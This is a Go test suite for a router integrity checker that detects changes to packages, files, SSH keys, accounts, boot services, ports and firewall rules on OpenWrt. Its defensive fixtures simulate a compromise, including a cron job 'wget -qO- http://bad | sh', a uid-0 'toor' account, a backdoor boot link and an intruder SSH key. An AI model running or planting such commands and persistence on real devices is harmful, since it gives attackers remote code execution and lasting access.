package integrity

import (
	"context"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/masaleem-oss/Fengard/internal/config"
	"github.com/masaleem-oss/Fengard/internal/store"
)

const opkgStatus = `Package: dropbear
Version: 2022.82-2
Status: install ok installed
Architecture: aarch64_cortex-a53

Package: luci
Version: git-23.1
Status: install user installed

Package: gone
Version: 1
Status: deinstall ok not-installed
`

const passwd = `root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
`

const tcp = `  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1001 1 0000000000000000 100 0 0 10 0
   1: 0108A8C0:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1002 1 0000000000000000 100 0 0 10 0
   2: 0108A8C0:0050 0208A8C0:C350 01 00000000:00000000 00:00000000 00000000     0        0 1003 1 0000000000000000 100 0 0 10 0
`

const udp = `  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode ref pointer drops
  10: 00000000:0043 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 2001 2 0000000000000000 0
  11: 00000000:D431 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 2002 2 0000000000000000 0
`

const firewallShow = `firewall.@defaults[0]=defaults
firewall.@zone[1]=zone
firewall.@zone[1].name='wan'
firewall.@rule[0]=rule
firewall.@rule[0].name='Allow-Ping'
firewall.@rule[0].src='wan'
firewall.@rule[0].proto='icmp'
firewall.@rule[0].icmp_type='echo-request'
firewall.@rule[0].family='ipv4'
firewall.@rule[0].target='ACCEPT'
firewall.@rule[1]=rule
firewall.@rule[1].name='lan-only'
firewall.@rule[1].src='lan'
firewall.@rule[1].target='ACCEPT'
firewall.@redirect[0]=redirect
firewall.@redirect[0].name='nas'
firewall.@redirect[0].src='wan'
firewall.@redirect[0].proto='tcp'
firewall.@redirect[0].src_dport='8443'
firewall.@redirect[0].dest_ip='192.168.8.20'
firewall.@redirect[0].dest_port='443'
firewall.@redirect[1]=redirect
firewall.@redirect[1].name='off'
firewall.@redirect[1].enabled='0'
firewall.@redirect[1].src_dport='1'
firewall.fengard=include
`

func write(t *testing.T, root, p, data string) {
	t.Helper()
	full := filepath.Join(root, filepath.FromSlash(p))
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(full, []byte(data), 0o644); err != nil {
		t.Fatal(err)
	}
}

func link(t *testing.T, root, p, target string) {
	t.Helper()
	full := filepath.Join(root, filepath.FromSlash(p))
	os.MkdirAll(filepath.Dir(full), 0o755)
	if err := os.Symlink(target, full); err != nil {
		t.Fatal(err)
	}
}

// fakeRouter is a small openwrt with an overlay
func fakeRouter(t *testing.T) (string, *Collector) {
	t.Helper()
	root := t.TempDir()
	write(t, root, "/etc/openwrt_release", "DISTRIB_ID='OpenWrt'\nDISTRIB_RELEASE='21.02-SNAPSHOT'\nDISTRIB_DESCRIPTION='OpenWrt 21.02-SNAPSHOT r15812'\n")
	write(t, root, "/etc/glversion", "4.3.7\n")
	write(t, root, "/usr/lib/opkg/status", opkgStatus)
	write(t, root, "/etc/passwd", passwd)
	write(t, root, "/etc/dropbear/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFake owner@laptop\n")
	link(t, root, "/etc/rc.d/S50dropbear", "../init.d/dropbear")
	link(t, root, "/etc/rc.d/S95fengard", "../init.d/fengard")
	write(t, root, "/etc/crontabs/root", "# nightly\n0 3 * * * /usr/bin/glcheck\n")
	write(t, root, "/proc/net/tcp", tcp)
	write(t, root, "/proc/net/udp", udp)
	write(t, root, "/proc/1234/comm", "dropbear\n")
	link(t, root, "/proc/1234/fd/3", "socket:[1001]")
	link(t, root, "/proc/self/fd/7", "socket:[1002]") // fengard's own dashboard
	write(t, root, "/overlay/upper/usr/bin/glcheck", "#!/bin/sh\n")
	os.Chmod(filepath.Join(root, "overlay/upper/usr/bin/glcheck"), 0o755)
	write(t, root, "/overlay/upper/usr/lib/lua/luci/view.lua", "-- not a program")
	write(t, root, "/overlay/upper/usr/lib/libfoo.so.1", "elf")
	write(t, root, "/overlay/upper/etc/config/network", "config interface 'lan'") // settings, not watched
	write(t, root, "/overlay/upper/usr/bin/fengardd", "fengard itself")
	write(t, root, "/overlay/upper/usr/bin/fengardd.new", "fengard mid update")
	write(t, root, "/overlay/upper/etc/init.d/fengard", "#!/bin/sh /etc/rc.common")
	write(t, root, "/overlay/upper/etc/fengard/guard.sh", "data dir")
	link(t, root, "/overlay/upper/etc/rc.d/S95fengard", "../init.d/fengard")
	col := &Collector{
		Root:     root,
		Exclude:  []string{"/usr/bin/fengardd", "/etc/init.d/fengard", "/etc/fengard"},
		UCI:      func(context.Context) ([]byte, error) { return []byte(firewallShow), nil },
		Forwards: func() []string { return []string{"tcp 25565 to 192.168.8.50:25565"} },
	}
	return root, col
}

func collect(t *testing.T, col *Collector, w string) map[string]string {
	t.Helper()
	m, _, err := col.Collect(context.Background(), w)
	if err != nil {
		t.Fatalf("%s: %v", w, err)
	}
	return m
}

func TestWatchesMatchConfig(t *testing.T) {
	if !slices.Equal(Watches, config.SecurityWatches) {
		t.Fatalf("integrity watches %v, config allows %v", Watches, config.SecurityWatches)
	}
	for _, w := range Watches {
		if Labels[w] == "" {
			t.Errorf("%s has no label", w)
		}
	}
}

func TestCollectEachWatch(t *testing.T) {
	_, col := fakeRouter(t)
	if fw := col.Firmware(); fw != "OpenWrt 21.02-SNAPSHOT r15812, GL.iNet 4.3.7" {
		t.Errorf("firmware %q", fw)
	}
	pk := collect(t, col, Packages)
	if len(pk) != 2 || pk["dropbear"] != "2022.82-2" || pk["luci"] != "git-23.1" {
		t.Errorf("packages %v", pk)
	}
	files := collect(t, col, Files)
	if _, ok := files["/usr/bin/glcheck"]; !ok {
		t.Errorf("changed program missing: %v", files)
	}
	if _, ok := files["/usr/lib/libfoo.so.1"]; !ok {
		t.Errorf("library missing: %v", files)
	}
	for _, p := range []string{"/usr/lib/lua/luci/view.lua", "/etc/config/network"} {
		if _, ok := files[p]; ok {
			t.Errorf("%s shouldn't be watched", p)
		}
	}
	if v := files["/usr/bin/glcheck"]; !strings.HasPrefix(v, "file 10 -rwxr-xr-x ") || len(v) < 64 {
		t.Errorf("glcheck = %q", v)
	}
	ssh := collect(t, col, SSHKeys)
	if len(ssh) != 1 {
		t.Fatalf("ssh %v", ssh)
	}
	for k, v := range ssh {
		if !strings.HasPrefix(k, "SHA256:") || !strings.HasSuffix(k, " /etc/dropbear/authorized_keys") || v != "ssh-ed25519 owner@laptop" {
			t.Errorf("ssh key %q = %q", k, v)
		}
	}
	acc := collect(t, col, Accounts)
	if len(acc) != 1 || acc["root"] != "uid 0 shell /bin/ash" {
		t.Errorf("accounts %v", acc)
	}
	st := collect(t, col, Startup)
	if len(st) != 2 || st["service dropbear"] != "on" || st["cron root: 0 3 * * * /usr/bin/glcheck"] != "on" {
		t.Errorf("startup %v", st)
	}
	ports := collect(t, col, Ports)
	want := map[string]string{"tcp *:22": "dropbear", "udp *:67": ""}
	if len(ports) != len(want) {
		t.Errorf("ports %v, want %v", ports, want)
	}
	for k, v := range want {
		if got, ok := ports[k]; !ok || got != v {
			t.Errorf("port %s = %q, want %q (all %v)", k, got, v, ports)
		}
	}
	ex := collect(t, col, Exposure)
	wantEx := []string{
		"allow icmp echo-request ipv4",
		"forward tcp 8443 to 192.168.8.20:443",
		"fengard forward tcp 25565 to 192.168.8.50:25565",
	}
	if len(ex) != len(wantEx) {
		t.Errorf("exposure %v", ex)
	}
	for _, k := range wantEx {
		if _, ok := ex[k]; !ok {
			t.Errorf("exposure missing %q: %v", k, ex)
		}
	}
}

func TestApkPackages(t *testing.T) {
	root := t.TempDir()
	write(t, root, "/lib/apk/db/installed", "C:Q1abc\nP:busybox\nV:1.36.1-r2\nA:aarch64\n\nP:dropbear\nV:2024.86-r1\n")
	pk := collect(t, &Collector{Root: root}, Packages)
	if len(pk) != 2 || pk["busybox"] != "1.36.1-r2" || pk["dropbear"] != "2024.86-r1" {
		t.Errorf("apk %v", pk)
	}
	if _, _, err := (&Collector{Root: t.TempDir()}).Collect(context.Background(), Packages); err == nil {
		t.Error("no package database should be an error, not an empty list")
	}
}

func TestFengardsOwnFilesExcluded(t *testing.T) {
	_, col := fakeRouter(t)
	files := collect(t, col, Files)
	for p := range files {
		if strings.Contains(p, "fengard") {
			t.Errorf("fengard's own file %s is watched", p)
		}
	}
	st := collect(t, col, Startup)
	for k := range st {
		if strings.Contains(k, "fengard") {
			t.Errorf("fengard's own service %s is watched", k)
		}
	}
}

func TestFilesWithoutOverlay(t *testing.T) {
	root := t.TempDir()
	write(t, root, "/usr/sbin/dropbear", "binary")
	write(t, root, "/etc/init.d/dropbear", "script")
	write(t, root, "/home/user/notes", "not watched")
	files := collect(t, &Collector{Root: root}, Files)
	if len(files) != 2 {
		t.Errorf("files %v", files)
	}
}

func TestFileChangeText(t *testing.T) {
	// overlayfs whiteouts are char devices and making one needs root, so only the text is checked
	if got := fileChange("file 1 -rwxr-xr-x abc", "deleted"); got != "deleted" {
		t.Errorf("deletion text %q", got)
	}
	if got := fileChange("file 1 -rw-r--r-- abc", "file 1 -rwxr-xr-x abc"); got != "permissions changed from -rw-r--r-- to -rwxr-xr-x" {
		t.Errorf("mode text %q", got)
	}
}

func TestHashingIsBounded(t *testing.T) {
	root := t.TempDir()
	write(t, root, "/overlay/upper/usr/bin/big", strings.Repeat("x", 2000))
	write(t, root, "/overlay/upper/usr/bin/small", "x")
	col := &Collector{Root: root, MaxFileSize: 1000}
	files := collect(t, col, Files)
	if v := files["/usr/bin/big"]; v != "file 2000 -rw-r--r-- unhashed" {
		t.Errorf("big file %q", v)
	}
	if v := files["/usr/bin/small"]; !strings.HasPrefix(v, "file 1 -rw-r--r-- ") || strings.HasSuffix(v, "unhashed") {
		t.Errorf("small file %q", v)
	}
	// the total budget runs out
	col = &Collector{Root: root, MaxHashBytes: 1500}
	_, cut, _ := col.Collect(context.Background(), Files)
	if !cut {
		t.Error("going over the hash budget should say the check was cut short")
	}
	// and the file count
	for i := range 5 {
		write(t, root, "/overlay/upper/bin/f"+string(rune('a'+i)), "x")
	}
	col = &Collector{Root: root, MaxFiles: 3}
	m, cut, _ := col.Collect(context.Background(), Files)
	if len(m) != 3 || !cut {
		t.Errorf("max files: %d files, cut %v", len(m), cut)
	}
}

func newChecker(t *testing.T, col *Collector) (*Checker, *store.KV) {
	t.Helper()
	db, err := store.Open(filepath.Join(t.TempDir(), "test.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { db.Close() })
	kv, _ := db.KV("integrity")
	return &Checker{Collector: col, KV: kv, Available: true}, kv
}

func TestFirstCheckIsTheBaseline(t *testing.T) {
	_, col := fakeRouter(t)
	c, _ := newChecker(t, col)
	alerted := 0
	c.OnChanges = func(all, fresh []Change) { alerted++ }
	r := c.Check(context.Background())
	if len(r.Changes) != 0 || alerted != 0 {
		t.Fatalf("first check found %v", r.Changes)
	}
	st := c.Status()
	if st.Baseline.IsZero() || st.LastCheck.IsZero() || st.Firmware == "" {
		t.Errorf("status %+v", st)
	}
	if r := c.Check(context.Background()); len(r.Changes) != 0 {
		t.Errorf("nothing changed but found %v", r.Changes)
	}
}

func TestEachWatchNoticesChanges(t *testing.T) {
	root, col := fakeRouter(t)
	c, _ := newChecker(t, col)
	var alerts [][]Change
	c.OnChanges = func(all, fresh []Change) { alerts = append(alerts, fresh) }
	c.Check(context.Background())

	write(t, root, "/usr/lib/opkg/status", strings.Replace(opkgStatus, "2022.82-2", "2022.82-3", 1)+"\nPackage: socat\nVersion: 1.7\nStatus: install user installed\n")
	write(t, root, "/usr/lib/opkg/info/socat.list", "/usr/bin/socat\n")
	write(t, root, "/overlay/upper/usr/bin/socat", "elf")
	write(t, root, "/overlay/upper/usr/bin/glcheck", "#!/bin/sh\nevil\n")
	write(t, root, "/etc/dropbear/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeKeyFakeKeyFakeKeyFakeKeyFakeKeyFake owner@laptop\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB intruder@box\n")
	write(t, root, "/etc/passwd", passwd+"toor:x:0:0::/root:/bin/ash\n")
	link(t, root, "/etc/rc.d/S99backdoor", "../init.d/backdoor")
	write(t, root, "/etc/crontabs/root", "0 3 * * * /usr/bin/glcheck\n*/5 * * * * wget -qO- http://bad | sh\n")
	write(t, root, "/proc/net/tcp", tcp+"   3: 00000000:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1009 1 0000000000000000 100 0 0 10 0\n")
	col.UCI = func(context.Context) ([]byte, error) {
		return []byte(firewallShow + "firewall.@rule[9]=rule\nfirewall.@rule[9].src='wan'\nfirewall.@rule[9].dest_port='22'\nfirewall.@rule[9].proto='tcp'\nfirewall.@rule[9].target='ACCEPT'\n"), nil
	}

	r := c.Check(context.Background())
	want := map[string]string{
		"Updated dropbear from 2022.82-2 to 2022.82-3":                       Packages,
		"Installed socat 1.7":                                                Packages,
		"New file /usr/bin/socat, from the socat package":                    Files,
		"/usr/bin/glcheck: contents changed":                                 Files,
		"New account toor that can log in with full admin rights (/bin/ash)": Accounts,
		"backdoor now starts at boot":                                        Startup,
		"New scheduled job for root: */5 * * * * wget -qO- http://bad | sh":  Startup,
		"New open port TCP 8080 on all addresses":                            Ports,
		"New: firewall rule letting the internet reach tcp port 22":          Exposure,
	}
	got := map[string]string{}
	for _, ch := range r.Changes {
		got[ch.What] = ch.Watch
	}
	for what, w := range want {
		if got[what] != w {
			t.Errorf("missing %s change %q", w, what)
		}
	}
	var sshNew bool
	for _, ch := range r.Changes {
		if ch.Watch == SSHKeys && ch.Kind == "added" && strings.Contains(ch.What, "ssh-rsa intruder@box") {
			sshNew = true
		}
	}
	if !sshNew {
		t.Errorf("new ssh key not named: %v", got)
	}
	if len(r.Changes) != len(want)+1 {
		t.Errorf("%d changes, want %d: %v", len(r.Changes), len(want)+1, got)
	}
	if len(alerts) != 1 || len(alerts[0]) != len(r.Changes) {
		t.Fatalf("alerts %v", alerts)
	}
	// the same changes again aren't news
	r2 := c.Check(context.Background())
	if len(alerts) != 1 {
		t.Errorf("unchanged changes alerted again")
	}
	if len(r2.Changes) != len(r.Changes) || !r2.Changes[0].FirstSeen.Equal(r.Changes[0].FirstSeen) {
		t.Errorf("first seen moved")
	}
	// removing something is a change too
	os.Remove(filepath.Join(root, "etc/rc.d/S50dropbear"))
	c.Check(context.Background())
	if len(alerts) != 2 || len(alerts[1]) != 1 || alerts[1][0].What != "dropbear no longer starts at boot" {
		t.Errorf("removal alert %v", alerts)
	}
}

func TestApproveUpdatesTheBaseline(t *testing.T) {
	root, col := fakeRouter(t)
	c, kv := newChecker(t, col)
	c.Check(context.Background())
	write(t, root, "/etc/passwd", passwd+"toor:x:0:0::/root:/bin/ash\n")
	link(t, root, "/etc/rc.d/S99backdoor", "../init.d/backdoor")
	r := c.Check(context.Background())
	if len(r.Changes) != 2 {
		t.Fatalf("changes %v", r.Changes)
	}
	if n := c.Approve([]string{r.Changes[0].ID}, false); n != 1 {
		t.Fatalf("approved %d", n)
	}
	if st := c.Status(); len(st.Changes) != 1 || st.Changes[0].ID != r.Changes[1].ID {
		t.Fatalf("after approving one %v", st.Changes)
	}
	if r := c.Check(context.Background()); len(r.Changes) != 1 {
		t.Fatalf("approved change came back %v", r.Changes)
	}
	if n := c.Approve(nil, false); n != 0 {
		t.Errorf("nothing asked, %d approved", n)
	}
	if n := c.Approve(nil, true); n != 1 {
		t.Errorf("approve all = %d", n)
	}
	if r := c.Check(context.Background()); len(r.Changes) != 0 {
		t.Fatalf("after approving all %v", r.Changes)
	}
	// a removal approved goes from the baseline
	os.Remove(filepath.Join(root, "etc/rc.d/S99backdoor"))
	if r := c.Check(context.Background()); len(r.Changes) != 1 || r.Changes[0].Kind != "removed" {
		t.Fatalf("removal %v", r.Changes)
	}
	c.Approve(nil, true)
	if r := c.Check(context.Background()); len(r.Changes) != 0 {
		t.Fatalf("approved removal came back %v", r.Changes)
	}
	// it all survives a restart
	again := &Checker{Collector: col, KV: kv, Available: true}
	if st := again.Status(); st.Baseline.IsZero() || st.LastCheck.IsZero() {
		t.Errorf("not saved: %+v", st)
	}
	if r := again.Check(context.Background()); len(r.Changes) != 0 {
		t.Errorf("after a restart %v", r.Changes)
	}
}

func TestFirmwareUpgradeTakesANewBaseline(t *testing.T) {
	root, col := fakeRouter(t)
	c, _ := newChecker(t, col)
	var from, to string
	c.OnFirmware = func(f, t string) { from, to = f, t }
	changes := 0
	c.OnChanges = func(all, fresh []Change) { changes++ }
	c.Check(context.Background())
	write(t, root, "/etc/glversion", "4.5.0\n")
	write(t, root, "/usr/lib/opkg/status", strings.Replace(opkgStatus, "2022.82-2", "2024.1", 1))
	r := c.Check(context.Background())
	if len(r.Changes) != 0 || changes != 0 {
		t.Errorf("upgrade flagged %v", r.Changes)
	}
	if from != "OpenWrt 21.02-SNAPSHOT r15812, GL.iNet 4.3.7" || to != "OpenWrt 21.02-SNAPSHOT r15812, GL.iNet 4.5.0" {
		t.Errorf("firmware change %q to %q", from, to)
	}
	if c.Status().Firmware != to {
		t.Error("baseline keeps the old firmware")
	}
}

func TestWatchesOffAndUnreadable(t *testing.T) {
	root, col := fakeRouter(t)
	c, _ := newChecker(t, col)
	off := map[string]bool{Accounts: true}
	c.Watching = func(w string) bool { return !off[w] }
	c.Check(context.Background())
	write(t, root, "/etc/passwd", passwd+"toor:x:0:0::/root:/bin/ash\n")
	if r := c.Check(context.Background()); len(r.Changes) != 0 {
		t.Errorf("a watch that's off found %v", r.Changes)
	}
	// turned on later it starts from now
	off = map[string]bool{}
	if r := c.Check(context.Background()); len(r.Changes) != 0 {
		t.Errorf("a watch turned on found %v", r.Changes)
	}
	// uci missing for a night isn't every rule removed
	col.UCI = func(context.Context) ([]byte, error) { return nil, os.ErrNotExist }
	r := c.Check(context.Background())
	if len(r.Changes) != 0 || r.Errors[Exposure] == "" {
		t.Errorf("unreadable watch: %v %v", r.Changes, r.Errors)
	}
}

func TestComputerModeDoesNothing(t *testing.T) {
	c := &Checker{Collector: &Collector{Root: t.TempDir()}}
	if c.Trigger() {
		t.Error("check started on a computer")
	}
	if st := c.Status(); st.Available || st.Changes == nil {
		t.Errorf("status %+v", st)
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	c.Run(ctx)
}

func TestParseSocketIPv6(t *testing.T) {
	l, ok := parseSocket("tcp6", "   0: 00000000000000000000000000000000:0016 00000000000000000000000000000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 5 1 0 100 0 0 10 0")
	if !ok || l.key() != "tcp [*]:22" {
		t.Errorf("ipv6 any %v %q", ok, l.key())
	}
	l, ok = parseSocket("tcp6", "   0: 00000000000000000000000001000000:0035 00000000000000000000000000000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 5 1 0 100 0 0 10 0")
	if !ok || l.key() != "tcp [::1]:53" {
		t.Errorf("ipv6 loopback %v %q", ok, l.key())
	}
	if got := portText("tcp [*]:22"); got != "TCP 22 on all addresses (IPv6)" {
		t.Errorf("port text %q", got)
	}
}
